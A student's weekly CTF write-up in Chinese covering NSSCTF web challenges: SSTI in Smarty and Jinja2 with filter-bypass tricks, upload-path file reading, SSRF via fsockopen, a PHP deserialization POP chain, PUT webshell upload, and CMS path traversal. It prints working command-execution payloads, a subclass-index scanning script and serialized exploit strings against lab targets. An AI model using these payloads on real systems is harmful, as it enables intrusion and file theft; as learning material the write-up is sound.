# 2.24~3.2 WEEK1

## 概况

主要刷了nssctf上的ssti题



## 部分wp

### web11

![image-20250227215646220](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227215646220.png)



观察到该页面底部写着build with smarty，再结合提示，可以猜出这大概是ssti模板注入。又发现api usage里写着get xff，所以用bp抓包，修改一下xff头，写入{{2*2}}

![image-20250227215728096](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227215728096.png)

经过测试，发现存在ssti注入，故payload：

X-Forwarded-For:{{system("ls /")}}

X-Forwarded-For:{{system("cat /flag")}}

回显得到flag



------

### ez_SSTI

get传参，name={{2*2}}，回显的结果为4，显然存在ssti注入

输入：`?name={{''.__class__}}`

得到回显：<class 'str'>，由此可知当前类为str

输入：`?name={{''.__class__.__mro__}}可以查看str类的调用顺序`

回显为：(<class 'str'>, <class 'object'>)

输入：`?name={{''.__class__.__base__}}`

得到回显：<class 'object'>，同调用mro方法，由此可知str的父类是object

<!--//object类是所有类的基类-->

输入：`?name={{''.__class__.__base__.__subclasses__()}}`

或`?name={{''.__class__.__bases__[0].__subclasses__()}}`

或`?name={{''.__class__.__mro__[1].__subclasses__()}}`，查看object基类的所有子类

得到回显：

![image-20250227215936166](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227215936166.png)

这里有很多类，但我们需要的是可以执行系统命令的class 'os._wrap_close'，ctrlf可以找到该类的位置所在，但并不清楚该类的序号，一个一个数自然是不现实。网上找了一个可以查询需要类的序号的脚本：

```python
import requests

headers = {

  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'}

for i in range(500):

  url = "http://node5.anna.nssctf.cn:26744/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"#查找object类所有子类的payload

  res = requests.get(url=url, headers=headers)

  \#print(res.text)

  if 'os._wrap_close' in res.text:  #写入需要的类  

​    print(i)
```

![image-20250227220008479](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227220008479.png)

结果为137

输入：`?name={{''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__}}`，初始化以后访问全局变量，得到回显正常，即可通过popen，read方法执行命令

输入：`?name={{''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('ls').read()}}`

得到回显：app.py flag 

输入：

`?name={{''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat flag').read()}}`

或`?name={{''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('flag').read()}}`

得到flag



```
一些整理：

.__class__：返回当前类

.__subclasses__：获取指定类的所有子类

.__bases__：返回所有父类

.__base__：返回当前类的父类

.__mro__：获取当前类的调用顺序
```

参考文章：

[flask模板注入(ssti),一篇就够了_flask"+"ssti"+"总结-CSDN博客](https://blog.csdn.net/qq_59950255/article/details/123215817)

[调用系统命令 os.system()和os.popen() - KeithTt - 博客园](https://www.cnblogs.com/keithtt/p/7709445.html)

 

------

### flask真香

![image-20250227220220533](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227220220533.png)

打开发现是一个3d建模界面，乱点一气按钮，发现右下角的方向键，点击后出现了报错界面

![image-20250227220233846](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227220233846.png)

根据标题提示，猜测这里大概存在注入点。于是在url后输入{{2*2}}，发现回显为4，输入{{2*'2'}}，回显为22，故存在ssti，且为jinja2

输入`{{''.__class__}}`，发现被ban了，经过尝试这里大概是class被禁用了，同样的还有subclasses

故payload：

```
{{''['__cla'+'ss__']}}

{{''['__cla'+'ss__'].__base__['__subc'+'lasses__']()}}

{{''['__cla'+'ss__'].__base__['__subc'+'lasses__']()[195].__init__.__globals__['pop'+'en']('ls /').read()}}
```



```
一些整理：

{{''.__class__}}和{{().__class__}}：
前者的操作对象是''，即空字符串，其在class方法处理后的结果为字符串类str，<class 'str'>
后者的操作对象是()，即空元组，其在class方法处理后的结果为元组元组类tuple，<class 'tuple'>

字典键访问&点号访问：
字典键访问（obj['key']）适用于字典或类似字典的对象。
点号访问（obj.key）适用于对象的属性访问。
```



------

### Normal SSTI

打开一看发现提示：try to check /test?url=xxx

根据提示很显然这是一道ssti题目，先测试一下是否存在模板注入，输入/test?url={{2*2}}，得到回显do a real p1g，被骂了，显然有些符号被ban了

![image-20250227220744524](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227220744524.png)

bp爆破一下，发现{{，[，]，__，'，*，.全部被ban了

输入：?url={%print(2)%}，成功绕过“{{”，并得到回显this is your url 2

因为.和[和'都被ban了，所以这里只能用attr绕过{%print(()|attr("__class__"))%}

但由于__等被ban了，所以这里用unicode绕过

__class__的unicode编码是\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f

故payload：

url={%print(()|attr(%22\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f%22))%}

得到回显：this is your url <class 'tuple'>

调用flask里的lipsum方法，`lipsum.__globals__`

`__globals__`的unicode编码为：\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f

故payload：

url={%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))%}

引用os模块来进行命令执行{%print(lipsum|attr("globals__.get("os").popen("ls /").read())%}

Payload:

url={%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22)|attr(%22\u0067\u0065\u0074%22)(%22os%22)|attr(%22\u0070\u006f\u0070\u0065\u006e%22)(%22\u006c\u0073\u0020\u002f%22)|attr(%22\u0072\u0065\u0061\u0064%22)())%}

回显：

this is your url bin boot dev etc flag home lib lib64 media mnt opt proc root run run.sh sbin srv sys tmp usr var 

命令：

print(lipsum|attr("globals__.get("os").popen("cat /flag").read())%}

Payload:

url={%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22)|attr(%22\u0067\u0065\u0074%22)(%22os%22)|attr(%22\u0070\u006f\u0070\u0065\u006e%22)(%22\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067%22)|attr(%22\u0072\u0065\u0061\u0064%22)())%}

得到flag

 

参考文章：

[最全SSTI模板注入waf绕过总结（6700+字数！）_ssti注入绕过-CSDN博客](https://blog.csdn.net/2301_76690905/article/details/134301620)



------

### babyupload

打开发现可以上传文件，但经过尝试发现任何文件都无法上传。

右键查看源码，发现有一个/source，打开之后，在本地下载了一个www.zip，解压得到app.py

审计代码：

```python
from flask import Flask, request, redirect, g, send_from_directory

import sqlite3

import os

import uuid

app = Flask(__name__)

\#数据库

SCHEMA = """CREATE TABLE files (

id text primary key,

path text

);

"""

\#连接数据库

def db():

  g_db = getattr(g, '_database', None)

  if g_db is None:

​    g_db = g._database = sqlite3.connect("database.db")

  return g_db

 

\#初始化数据库

@app.before_first_request

def setup():

  os.remove("database.db")#清除数据库文件

  cur = db().cursor()

  cur.executescript(SCHEMA)

\#网页源码

@app.route('/')

def hello_world():

  return """<!DOCTYPE html>

<html>

<body>

<form action="/upload" method="post" enctype="multipart/form-data">

  Select image to upload:

  <input type="file" name="file">

  <input type="submit" value="Upload File" name="submit">

</form>

<!-- /source -->

</body>

</html>"""

\#从/var/www/html目录下下载www.zip

@app.route('/source')

def source():

  return send_from_directory(directory="/var/www/html/", path="www.zip", as_attachment=True)

\#对上传文件进行过滤

@app.route('/upload', methods=['POST'])

def upload():

  if 'file' not in request.files:

​    return redirect('/')

  file = request.files['file']

  if "." in file.filename:

​    return "Bad filename!", 403 

​    \#如果文件名存在'.'则返回bad filename！并拒绝上传

  conn = db()

  cur = conn.cursor()

  uid = uuid.uuid4().hex

  try:

​    cur.execute("insert into files (id, path) values (?, ?)", (uid, file.filename,))

  except sqlite3.IntegrityError:

​    return "Duplicate file"

  conn.commit()

  file.save('uploads/' + file.filename)

  return redirect('/file/' + uid)

  \#将文件保存在uploads/目录下

 

@app.route('/file/<id>')

def file(id):

  conn = db()

  cur = conn.cursor()

  cur.execute("select path from files where id=?", (id,))

  \#执行sql语句，从files表中查询与id参数匹配的所有数据

  res = cur.fetchone()

  \#res为返回的查询结果

  if res is None:

​    return "File not found", 404

​    \#当查询结果不存在时返回404

  \# print(res[0])

  with open(os.path.join("uploads/", res[0]), "r") as f:

​    return f.read()

​    \#拼接文件路径，uploads/查询到的文件名，并以只读模式打开该文件

\#启用flask，监听80端口

if __name__ == '__main__':

  app.run(host='0.0.0.0', port=80)
```

![image-20250227221154016](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227221154016.png)

查询资料后发现漏洞在os.path.join上，即只需要让该函数拼接的最后一段res[0]为/flag，即可查询根目录下的flag

经过代码审计，可以看出res[0]是上传文件的文件名，且该文件名不能有任何后缀

bp抓包修改文件名：![image-20250227221232676](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227221232676.png)

发送以后在响应里找到文件路径，打开该路径即是打开flag文件



------

### ez_ssrf

提示：访问/index.php

打开以后是一个Apache2的报错界面，根据提示打开/index.php，得到一段代码

```php
 <?php

highlight_file(__FILE__); 

error_reporting(0); 

 
$data=base64_decode($_GET['data']); 

$host=$_GET['host']; 

$port=$_GET['port']; 

 
$fp=fsockopen($host,intval($port),$error,$errstr,30); 

if(!$fp) { 

  die();

} 

else {

  fwrite($fp,$data); 

  while(!feof($data)) 

  {

​    echo fgets($fp,128); 

  }

  fclose($fp); 

} 
```

审计代码：

发现这里面有一个fsockopen函数，其语法为：

fsockopen(*hostname*, *port, errno, errstr, timeout*)

![image-20250227221540926](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227221540926.png)

根据标题，猜测这里存在ssrf，故可以通过fsockopen尝试构造请求来获取flag，fwrite会将data的数据base64解密后写入fp中，故我们可以通过操作data参数来利用fsockopen构造请求

dirsearch扫描一下，发现一个/flag

![image-20250227221553826](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227221553826.png)

故构造请求：

GET /flag.php HTTP/1.1 

Host:127.0.0.1

Connection:Close

Base64编码以后为

R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=

最终payload：

?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=



------

###  pklovecloud

```php
<?php  

include 'flag.php';

class pkshow 

{  

  function echo_name()   

  {      

​    return "Pk very safe^.^";    

  }  

} 

class acp 

{  

  protected $cinder;  

  public $neutron;

  public $nova;

  function __construct() 

  {    

​    $this->cinder = new pkshow;

  }  

  function __toString()    

  {      

​    if (isset($this->cinder))  

​      return $this->cinder->echo_name();    

  }  

}  

class ace

{   

  public $filename;   

  public $openstack;

  public $docker; 

  function echo_name()    

  {  

​    $this->openstack = unserialize($this->docker);

​    $this->openstack->neutron = $heat;

​    if($this->openstack->neutron === $this->openstack->nova)

​    {

​    $file = "./{$this->filename}";

​      if (file_get_contents($file))     

​      {        

​        return file_get_contents($file); 

​      }  

​      else 

​      { 

​        return "keystone lost~"; 

​      }   

​    }

  }  

}  

if (isset($_GET['pks']))  

{

  $logData = unserialize($_GET['pks']);

  echo $logData; 

} 

else 

{ 

  highlight_file(__file__); 

}

?>
```

审计代码，可以写出pop链：

ace echo_name<-acp toString<-acp construct

但为了利用file_get_contents函数，需要满足if($this->openstack->neutron === $this->openstack->nova)，即强等于要成立，所以可以让NULL===NULL，即nova为NULL

```php+HTML
class acp 

{  

  protected $cinder;  

  public $neutron;

  public $nova= NULL;

}  

$a=new acp();

echo serialize($a);
```

得到结果为：

O:3:"acp":3:{s:9:"*cinder";N;s:7:"neutron";N;s:4:"nova";N;}

```php
 exp：

<?php  

class acp 

{  

  protected $cinder;  

  public $neutron;

  public $nova;

  function __construct() 

  {    

​    $this->cinder = new ace;

  }  

}  

class ace

{   

  public $filename='flag.php';   

  public $openstack;

  public $docker=NULL; 

​    

}  

$a= new acp();

echo urlencode(serialize($a)); 

?>
```

Payload:

?pks=O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D

右键查看源码，得到提示：

<?php 

$heat="asdasdasdasd53asd3a1sd3a1sd3asd";

$flag="flag in /nssctfasdasdflag";  

```php
Exp2:

<?php  

class acp 

{  

  protected $cinder;  

  public $neutron;

  public $nova;

  function __construct() 

  {    

​    $this->cinder = new ace;

  }  

}  

class ace

{   

  public $filename='../nssctfasdasdflag';   

  public $openstack;

  public $docker=NULL; 

​    

}  

$a= new acp();

echo urlencode(serialize($a));

 

?>
```

Payload:

?pks=O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A19%3A%22..%2Fnssctfasdasdflag%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D



------

###  basic_check

打开后只有一句:

```
 <?php highlight_file(__FILE__);// Welcome to NSSCTF Round#1 Basic, have fun.
```

右键源码和dirsearch都找不出东西，看了wp才发现要用nikto -h扫一下

 ![image-20250227221938410](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227221938410.png)

 发现一句：HTTP method 'PUT' allows clients to save files on the web server. 

使用PUT上传木马：

![image-20250227221953306](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250227221953306.png)

 

蚁剑连接即可在根目录找到flag



------

### easycms

打开是一个蝉知的网页，右键查看源码没有什么提示，遂dirsearch -u扫一下，发下有个/admin.php

打开admin是一个登陆界面，且url后多了一串get参数：

/admin.php?m=user&f=login&referer=L2FkbWluLnBocA==

Base64解码一下，发现后面的一串是/admin.php

修改参数referer为/flag.php的base64编码，试图直接读取flag，但失败了

尝试一下弱口令，结果用admin/12345给登录成功了

进入后台，在页面随便点点，本来想试着上传一个木马，结果发现设计-主题-导入主题-上传主题包中有一个路径，根据提示，猜测应该可以利用该路径造成目录遍历漏洞。

又找了一圈，发现点击设计-自定义-导出主题后可以往本地下载一个压缩包，打开以后是网站源码。

浏览器右上角右键复制下载链接：

http://node7.anna.nssctf.cn:21474/admin.php?m=ui&f=downloadtheme&theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=

Base64解码以后是/var/www/html/system/tmp/theme/default/1.zip

将theme改为/flag的base64编码：

payload：http://node7.anna.nssctf.cn:21474/admin.php？m=ui&f=downloadtheme&theme=L2ZsYWc=

本地下载得到应该压缩包但无法解压，记事本打开后即可得到flag



## 下周计划

学习条件竞争和pickle反序列化